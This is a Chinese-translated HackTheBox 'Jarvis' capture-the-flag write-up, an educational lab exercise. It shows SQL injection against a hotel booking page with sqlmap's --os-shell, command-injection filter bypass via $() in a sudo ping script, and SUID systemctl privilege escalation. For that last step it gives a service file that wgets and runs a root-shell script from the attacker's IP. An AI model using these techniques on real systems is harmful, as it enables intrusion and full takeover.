<html>
<head>
<title>Jarvis — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">贾维斯——黑客盒子报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/jarvis-hackthebox-writeup-7341a4d2517a?source=collection_archive---------0-----------------------#2019-11-09">https://infosecwriteups.com/jarvis-hackthebox-writeup-7341a4d2517a?source=collection_archive---------0-----------------------#2019-11-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b242" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">贾维斯是一个简单而有趣的盒子。首先，我将在其中一个网页中找到一个SQLi，并使用<code class="fe kf kg kh ki b">sqlmap</code>获得一个基本的shell，然后绕过sudo文件上的过滤器来获得用户标志。为了找到根，我将滥用一个suid二进制文件来获得根shell。</h2></div><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi kj"><img src="../Images/eba1c450c675b478089b0c4bc95a031a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clRyKPcJEiyXqItBpXbIdw.png"/></div></div></figure><h1 id="c333" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">列举</h1><p id="b5ab" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi mj translated">像往常一样，让我们从Nmap扫描开始。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ms"><img src="../Images/01b1e7daec3d237dfc492e8a9f2157f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O39OyKlPyyfv95zWoO-WnQ.png"/></div></div></figure><p id="f18a" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">通常的端口<code class="fe kf kg kh ki b"><strong class="lp ir">22 and 80 and 64999</strong></code>是打开的。让我们在后台运行<code class="fe kf kg kh ki b"><strong class="lp ir">gobuster</strong></code> <strong class="lp ir"> <em class="my"> </em> </strong>，让<strong class="lp ir"> <em class="my">继续枚举。</em> </strong></p><h1 id="9fa2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">80 — HTTP</h1><p id="ae5a" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">我们看到了一个看起来像酒店预订网站的东西。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi mz"><img src="../Images/1b713281927219f2c781af92d372cd51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VcE4Dwf53G2qAAse4Hhakw.png"/></div></div></figure><p id="907f" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">我们看到页面上提到的<code class="fe kf kg kh ki b"><strong class="lp ir">supersecurehotel.htb</strong></code>。也许有一个虚拟主机，让我们把它添加到我们的<code class="fe kf kg kh ki b"><strong class="lp ir"><em class="my">/</em>etc/hosts</strong></code>文件中，看看服务器的响应是否有什么不同。</p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="fc94" class="ne kw iq ki b gy nf ng l nh ni"><strong class="ki ir">127.0.1.1       kali</strong></span><span id="d50b" class="ne kw iq ki b gy nj ng l nh ni"><strong class="ki ir">10.10.10.143    supersecurehotel.htb</strong></span><span id="744b" class="ne kw iq ki b gy nj ng l nh ni"><strong class="ki ir"># The following lines are desirable for IPv6 capable hosts<br/>::1     localhost ip6-localhost ip6-loopback<br/>ff02::1 ip6-allnodes<br/>ff02::2 ip6-allrouters</strong></span></pre><p id="8e1c" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">嗯，浏览到<code class="fe kf kg kh ki b"><strong class="lp ir">supersecurehotel.htb</strong></code>也是定向到同一个网页。</p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="73ae" class="ne kw iq ki b gy nf ng l nh ni"><a class="ae nk" href="http://supersecurehotel.htb/room.php?cod=1" rel="noopener ugc nofollow" target="_blank"><strong class="ki ir">http://supersecurehotel.htb/room.php?cod=1</strong></a><strong class="ki ir"> caught my attention. My guess was that the parameter </strong><strong class="ki ir"><em class="my">cod</em></strong><strong class="ki ir"> is vulnerable to SQLi.</strong></span></pre><p id="7183" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">使用一些基本的SQLi进行测试，证实了该站点确实容易受到SQLi的攻击。我检查了列的数量</p><p id="b9af" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated"><strong class="lp ir"><em class="my">http://supersecurehotel.htb/room.php?<a class="ae nk" href="http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201,2,3,4,5,6,7" rel="noopener ugc nofollow" target="_blank">cod=1%20UNION%20SELECT%201，2，3，4，5，6，7 </a></em> </strong>  <strong class="lp ir"> <em class="my">。<br/> <br/> </em> </strong>我将请求提供给sqlmap，并试图从sqlmap获得一个基本的shell。</p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="da23" class="ne kw iq ki b gy nf ng l nh ni"><strong class="ki ir">root@kali:~/htb/boxes/jarvis# sqlmap -r room.req --batch --os-shell</strong></span></pre><p id="2396" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">当sqlmap询问任何问题时，选择默认选项。<br/> …。而且成功了！</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nl"><img src="../Images/8de5a2f7c183af9ca48a5f797770506f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EwWfgUmrpsT5ZN7dc4Vm-Q.png"/></div></div></figure><p id="4ff0" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">我们可以得到一个合适的外壳</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nm"><img src="../Images/94350110a7ee289e402b51c10a5ef8ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xzq9ELMWhtTMlItuMyJhmg.png"/></div></div></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nn"><img src="../Images/1470670cf3ca7e36b67c9dd8c81bf692.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TO63dRPpxdnavSil_91DWA.png"/></div></div></figure><h1 id="fed8" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Privesc: www-data -&gt; pepper</h1><p id="d553" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">我们看到用户<code class="fe kf kg kh ki b"><strong class="lp ir">www-data</strong></code>拥有sudo权限，可以作为<code class="fe kf kg kh ki b"><strong class="lp ir">pepper</strong></code> <strong class="lp ir"> </strong>用户运行文件。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi no"><img src="../Images/b743d8449670e83c0e23b33578175d59.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OI9-pbmbBcxkTr99lK8H8w.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">sudo许可</figcaption></figure><p id="d515" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">这看起来像某种应用程序，让我们ping某人，并给我们统计数据。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nt"><img src="../Images/7d1e95fb0b0baf642c6760629eb3937b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZGkjQ2JOWi6Feudp4BohAQ.png"/></div></div></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nu"><img src="../Images/3958cc49e0be52111333ab3cfd946629.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gDHVQ7_USlNkpSJmKrT_ww.png"/></div></div></figure><p id="1b36" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">最初我尝试了简单的bash替换，看起来像是这样<code class="fe kf kg kh ki b">Got me.</code>我看了一下代码，看看它有什么样的过滤器，它允许哪些命令。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nv"><img src="../Images/0d1980e7536b436690e7dd77155f4b82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1Qp3_mqY1tn3YOji1fHFog.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">黑名单</figcaption></figure><p id="9006" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">所以，过滤字符可以让我们执行其他命令。我决定继续研究bash替换<code class="fe kf kg kh ki b"><strong class="lp ir">$()</strong></code>。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nw"><img src="../Images/c7feee8ca434ea7da73294a3f9d6696c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G5PGPV97ldrRi5FClRtJDg.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">成功了！</figcaption></figure><p id="6c6f" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">如果我删除特殊字符，只运行一个命令，它就能工作，我们会看到我们是以<code class="fe kf kg kh ki b"><strong class="lp ir">pepper</strong></code>用户的身份运行的。现在是获取shell的时候了。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nx"><img src="../Images/5b9717c8cb1d73b67f7c7e6fb3d57e94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZrHrMzXWtzhjxAGWwU65EA.png"/></div></div></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ny"><img src="../Images/f2e57a39f6ad2f061bca841b74331f00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W_yf6s3_3TMKrqiZeUpPtA.png"/></div></div></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nz"><img src="../Images/3d85c56095aa8aa5bffeabc0f401a3fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_4L2QwEE0Tq0FHJkdHa6-g.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">胡椒壳</figcaption></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oa"><img src="../Images/0fc2ba4974b4f5b5c4a443b340354416.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OIFAHZivL55T3qXttV5SKw.png"/></div></div></figure><h1 id="4d2e" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">胡椒-&gt;根</h1><p id="fa12" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">做一些基本的检查，我们看到我们在<code class="fe kf kg kh ki b"><strong class="lp ir">systemctl</strong></code>上设置了一个<code class="fe kf kg kh ki b"><strong class="lp ir">SUID</strong></code>。在<code class="fe kf kg kh ki b"><strong class="lp ir">systemctl</strong></code>的帮助下，我寻找到了一些方法。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ob"><img src="../Images/5399c4a8e7f91099a163cb0525419f4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VIdFNNa1Dki6r0gEKP2gew.png"/></div></div></figure><p id="0b71" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">我的页面是<a class="ae nk" href="https://gtfobins.github.io/gtfobins/systemctl/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/systemctl/</a></p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="3b75" class="ne kw iq ki b gy nf ng l nh ni"><strong class="ki ir">TF=$(mktemp).service<br/>echo '[Service]<br/>Type=oneshot<br/>ExecStart=/bin/sh -c "id &gt; /tmp/output"<br/>[Install]<br/>WantedBy=multi-user.target' &gt; $TF<br/>./systemctl link $TF<br/>./systemctl enable --now $TF</strong></span></pre><p id="6234" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">上面的脚本创建了一个<code class="fe kf kg kh ki b"><strong class="lp ir">service file</strong></code>，并在<code class="fe kf kg kh ki b"><strong class="lp ir">ExecStart</strong></code>字段中添加了一个命令，以便在服务启动时运行该命令。然后是<code class="fe kf kg kh ki b"><strong class="lp ir">linking the service</strong></code> <strong class="lp ir"> </strong>然后是<code class="fe kf kg kh ki b"><strong class="lp ir">enabling it.</strong></code> <strong class="lp ir"> </strong> <a class="ae nk" href="https://www.digitalocean.com/community/tutorials/how-to-use-systemctl-to-manage-systemd-services-and-units" rel="noopener ugc nofollow" target="_blank"> <strong class="lp ir">一个了解systemctl服务的牛人。</strong> </a></p><p id="36dc" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">我已经用上面的脚本试过了。但是并没有达到预期的效果。可以看看<a class="ae nk" href="https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6" rel="noopener">写我们自己的服务文件</a>。这是我写的。这是一个非常基本的服务文件，它在服务启动时执行<code class="fe kf kg kh ki b"><strong class="lp ir">ExecStart</strong></code>字段中提到的命令。</p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="074c" class="ne kw iq ki b gy nf ng l nh ni"><strong class="ki ir">[Unit]<br/>Description=Example systemd service.</strong></span><span id="1009" class="ne kw iq ki b gy nj ng l nh ni"><strong class="ki ir">[Service]<br/>Type=simple<br/>ExecStart=/bin/bash -c "/usr/bin/wget </strong><a class="ae nk" href="http://10.10.14.174/rootShell.py" rel="noopener ugc nofollow" target="_blank"><strong class="ki ir">http://10.10.14.174/rootShell.py</strong></a><strong class="ki ir"> -O /tmp/kkk.py ;/usr/bin/python /tmp/kkk.py"</strong></span><span id="202c" class="ne kw iq ki b gy nj ng l nh ni"><strong class="ki ir">[Install]<br/>WantedBy=multi-user.target</strong></span></pre><p id="9854" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">确保该服务文件不在<code class="fe kf kg kh ki b"><strong class="lp ir">/tmp/</strong></code>文件夹中。我被困在这里有一段时间了。然后我把服务文件移到了<code class="fe kf kg kh ki b"><strong class="lp ir">/home/pepper/</strong></code> <strong class="lp ir"> </strong>，这次它工作得很完美。医生是这么说的。</p><pre class="kk kl km kn gt na ki nb nc aw nd bi"><span id="7300" class="ne kw iq ki b gy nf ng l nh ni"><strong class="ki ir">link FILENAME</strong></span><span id="bf26" class="ne kw iq ki b gy nj ng l nh ni"><strong class="ki ir">Link a unit file that is not in the unit file search paths into the unit file search path. This requires an absolute path to a unit file. The effect of this can be undone with disable. The effect of this command is that a unit file is available for start and other commands although it is not installed directly in the unit search path.</strong></span></pre><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oc"><img src="../Images/e29d0f8d5450d55a8169141684ce6df2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ndKHvC9tXqPW7iX1QTiz3w.png"/></div></div></figure><p id="becf" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">一旦服务被链接，就像我们对任何普通服务一样启动服务，如<code class="fe kf kg kh ki b"><strong class="lp ir">apache2</strong></code> <strong class="lp ir">或</strong> <code class="fe kf kg kh ki b"><strong class="lp ir">docker</strong></code>。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi od"><img src="../Images/42fac7b414fcc3d503311715f4d2515c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PejKwNYF8u3IZ-hhuxaAUw.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">根深蒂固的</figcaption></figure><p id="9e4f" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated">感谢阅读，<br/>普伦(<a class="ae nk" href="https://twitter.com/PreethamBomma_" rel="noopener ugc nofollow" target="_blank">https://twitter.com/PreethamBomma_</a>)</p></div><div class="ab cl oe of hu og" role="separator"><span class="oh bw bk oi oj ok"/><span class="oh bw bk oi oj ok"/><span class="oh bw bk oi oj"/></div><div class="ij ik il im in"><p id="3802" class="pw-post-body-paragraph ln lo iq lp b lq mt jr ls lt mu ju lv lw mv ly lz ma mw mc md me mx mg mh mi ij bi translated"><em class="my">关注</em> <a class="ae nk" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="my"> Infosec报道</em> </a> <em class="my">获取更多此类精彩报道。</em></p><div class="ol om gp gr on oo"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="op ab fo"><div class="oq ab or cl cj os"><h2 class="bd ir gy z fp ot fr fs ou fu fw ip bi translated">信息安全报道</h2><div class="ov l"><h3 class="bd b gy z fp ot fr fs ou fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ow l"><p class="bd b dl z fp ot fr fs ou fu fw dk translated">medium.com</p></div></div><div class="ox l"><div class="oy l oz pa pb ox pc kt oo"/></div></div></a></div></div></div>    
</body>
</html>